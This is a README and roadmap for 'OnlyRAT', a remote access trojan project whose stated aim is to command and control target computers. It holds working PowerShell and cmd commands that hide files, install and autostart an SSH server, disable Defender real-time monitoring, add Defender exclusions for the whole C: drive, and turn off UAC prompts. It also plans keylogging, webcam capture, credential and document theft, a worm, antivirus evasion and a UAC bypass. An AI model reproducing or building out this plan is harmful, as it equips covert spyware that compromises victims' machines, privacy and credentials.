# Project: OnlyRAT [INCOMPLETE]
> Blue Cosmo | 01/07/2022
---

```
      ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
    :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
   +:+    +:+ :+:+:+  +:+ +:+      +:+ +:+  +:+    +:+  +:+   +:+  +:+       
  +#+    +:+ +#+ +:+ +#+ +#+       +#++:   +#++:++#:  +#++:++#++: +#+        
 +#+    +#+ +#+  +#+#+# +#+        +#+    +#+    +#+ +#+     +#+ +#+         
#+#    #+# #+#   #+#+# #+#        #+#    #+#    #+# #+#     #+# #+#          
########  ###    #### ########## ###    ###    ### ###     ### ###          
```


## Overview:
We are developing a Remote Access Tool [RAT]. We can use this to command and control [C2] target computers.

## Resources:
- [DucKey Logger](https://github.com/CosmodiumCS/DucKey-Logger)

```
# show files
attrib -h -s -r FILE

# hide file
attrib +h +s +r FILE
```

## ssh
```
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

```

## exclusion path
```
Set-MpPreference -DisableRealtimeMonitoring true
Add-MpPreference -ExclusionPatch c:\
Add-MpPreference -EsclusionProcess c:\windows\system32\cmd.exe
```

# disable uac
```powershell
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```

## Components:
- keylogger
	- backspace detection
- screen shots
- webcam
- exfiltration
	- stealing documents
- remote access
- credentials
	- web
	- computer
	- applications
	- wi-fi
- advanced reconnaissance
	- contact information
- privesc
- worm
- killswitch
- break pc
- generate in console payloads
- custom uploads

## Roadmap:
- finish advanced staging for remote connection
	- smtp workflow
		- send attacker ip
	- hide onlyrat user
	- reconnaissance scan
		- ip addr for ssh
		- smtp results
	- vm detection [wait]
- establish attacker console
	- python
	- send commands back and forth [ssh]
	- modular interface

- vbs special folders
- redevelop keylogger
- screenshots
- get base user creds for more advanced C2
- webcam
- obtaining credential
- obfuscation
	- av, vm detection/bypass
	- disabling firewall, av

## Stages:
1. initial payload creates files in start up directory
	- cmd to run administrative commands
		- set exec bypass
	- vbs file to hold `alt` + `y` for UAC bypass
	- self delete
2. new malware initializes remote connection
	- any additional tools can be installed remotely
	- keeps a low profile on the payload
3. modularity
	- having a directory to store resources for the RAT


## Extraneous:
- bsod
- web history
- user activity
